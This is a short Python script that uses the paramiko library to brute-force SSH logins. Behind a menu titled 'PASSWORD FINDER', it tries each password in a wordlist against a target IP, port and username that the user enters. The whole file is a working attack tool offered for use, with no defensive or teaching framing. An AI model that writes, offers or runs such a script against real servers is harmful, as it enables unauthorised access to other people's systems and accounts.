import paramiko
import os

def ssh_brute_force(target_ip, port, username, password_file):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open(password_file, 'r') as file:
            for password in file:
                password = password.strip()
                try:
                    print(f"[LOADING] {username}:{password}")
                    client.connect(target_ip, port=port, username=username, password=password, timeout=3)
                    print(f"[PASWORD FOUND] {username}:{password}")
                    return
                except paramiko.AuthenticationException:
                    print(f"[ERROR 404] {password}")
                except Exception as e:
                    print(f"[ERROR] {e}")
        print("[DONE NO PASSWORD FOUND]")
    except FileNotFoundError:
        print("[PASSWORD FILE PATH NOT FOUND]")

def menu():
    while True:
        os.system("clear")
        print("$user:root{fortunela}")
        print("===PASSWORD FINDER===")
        print("<===================>")
        print("1. Brute Force")
        print("2. Exit")
        choice = input("$root: Select an option ")

        if choice == "1":
            target_ip = input("[IP] input: ")
            port = int(input("[PORT] input: ") or 22)
            username = input("[username] input: ")
            password_file = input("[PASSWORD LIST]: ")
            ssh_brute_force(target_ip, port, username, password_file)
            input("[ENTER] key press")
        elif choice == "2":
            print("[EXIT]")
            break
        else:
            print("[ERROR 500]")
            input("[ENTER] key press")

if __name__ == "__main__":
    menu()
